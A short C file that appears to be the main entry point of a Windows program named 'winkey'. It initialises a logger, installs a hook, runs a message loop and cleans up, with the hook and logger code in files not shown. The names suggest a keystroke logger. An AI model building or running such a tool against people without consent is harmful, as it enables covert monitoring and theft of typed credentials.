// #ifndef _WIN32_WINNT
// #define _WIN32_WINNT 0x0A00 // Define Windows 10/11
// #endif

// #pragma warning(push)
// #pragma warning(disable: 4668) // Silencia avisos do SDK do Windows
// #include <windows.h>
// #include <stdio.h>
// #include <shellapi.h>
// #pragma warning(pop)

// Inclusões do teu projeto
#include "logger.h"
#include "hook.h"
#include "window.h"

int main(void)
{
    MSG msg;

    printf("winkey started\n");

    if (!logger_init())
    {
        printf("Logger failed\n");
        return 1;
    }

    if (!hook_install())
    {
        printf("Hook failed\n");
        logger_close();
        return 1;
    }

    while (GetMessage(
        &msg,
        NULL,
        0,
        0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    hook_uninstall();
    logger_close();

    return 0;
}